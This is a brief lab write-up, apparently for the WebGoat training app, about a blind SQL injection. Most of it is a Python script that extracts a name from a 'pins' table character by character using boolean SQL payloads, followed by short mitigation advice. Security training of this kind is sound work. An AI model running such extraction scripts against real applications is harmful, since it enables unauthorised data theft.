## Vulnerability:

blind sqli

## Exploitation:

Here's my script that exploits (finds requested name field: "Jill" in pins table) this issue:

```
#!/usr/bin/python3

# (http://docs.python-requests.org/en/latest/)
from requests import post
import sys

proxies = {
    "http": "http://127.0.0.1:8081",
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://webgoat.hacking-lab.com',
    'Referer': 'http://webgoat.hacking-lab.com/attack?Screen=13&menu=1100'
}

cookie = ''

for j in range(1,10):
    for i in range(65,122):
        payload = "101 AND (SELECT ascii(substr(name,"+str(j)+","+str(j)+")) FROM pins WHERE cc_number=4321432143214321)="+str(i)

        data = {'account_number': payload, 'SUBMIT': 'Go'}
        if cookie == '':
            r = post("http://webgoat.hacking-lab.com/attack?Screen=13&menu=1100", headers=headers, proxies=proxies, data=data)
            cookie = dict(JSESSIONID=r.cookies['JSESSIONID'])
        else:
            r = post("http://webgoat.hacking-lab.com/attack?Screen=13&menu=1100", headers=headers, proxies=proxies, cookies=cookie, data=data)

        if 'Account number is valid' in r.text:
            print(chr(i))
            break
```

## Mitigation:
1) validate input data

2) follow guidelines from https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet
